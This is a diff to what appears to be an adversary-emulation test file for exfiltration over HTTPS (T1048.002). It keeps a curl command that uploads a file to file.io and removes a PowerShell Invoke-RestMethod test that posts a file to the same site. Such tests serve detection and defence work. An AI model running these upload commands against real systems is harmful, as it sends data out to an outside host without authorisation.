@@ -23,26 +23,3 @@ atomic_tests:
     elevation_required: false
     command: |
       curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
-
-
-- name:  Exfiltrate data HTTPS using Invoke-RestMethod
-  description: |
-     Exfiltrate data HTTPS using Invoke-RestMethod to file share site file.io
-
-  supported_platforms:
-    - windows
-    - linux
-
-  input_arguments:
-    input_file:
-      description: Test file to upload
-      type: Path
-      default: PathToAtomicsFolder/T1048.002/files/artifact
-
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |-
-      $form = @{ file = Get-item -Path '(#{input_file})'; content_type = 'txt/plain'; autoDelete = 'true'; maxDownloads = '1' }
-      Invoke-RestMethod -Uri https://file.io -Method Post -Form $form
-
